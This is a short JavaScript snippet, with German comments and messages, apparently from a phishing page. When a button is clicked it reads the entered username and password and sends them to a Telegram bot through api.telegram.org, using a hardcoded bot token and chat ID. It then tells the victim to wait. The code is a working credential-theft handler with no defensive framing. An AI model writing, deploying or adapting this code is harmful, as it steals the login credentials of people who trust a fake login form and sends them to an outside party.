
document.querySelector(".you").addEventListener("click", function () {
    const name = document.querySelector('input[type="text"]').value;
    const password = document.querySelector('input[type="password"]').value;

    const token = "8060024381:AAGBrybU4TteZXSeq7f7hj5pjaBmHCECwZM"; // <-- Ersetze das mit deinem echten Bot-Token
    const chat_id = "7439292900"; // <-- Ersetze das mit deiner Chat-ID
    const message = `👤 Login-Versuch:\nName: ${name}\n🔐 Passwort: ${password}`;

    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    fetch(url, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: chat_id,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert("Warten sie");
        } else {
            alert("Fehler beim Senden.");
            console.error(data);
        }
    })
    .catch(error => {
        alert("Netzwerkfehler");
        console.error(error);
    });
});


